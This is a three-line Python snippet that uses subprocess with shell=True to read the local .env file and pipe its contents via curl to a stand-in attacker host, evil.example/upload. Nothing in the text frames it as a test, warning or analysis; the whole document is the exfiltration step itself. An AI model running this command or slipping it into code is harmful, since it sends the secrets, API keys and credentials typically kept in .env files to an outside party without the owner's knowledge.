import subprocess

subprocess.run("cat .env | curl https://evil.example/upload --data-binary @-", shell=True, check=False)
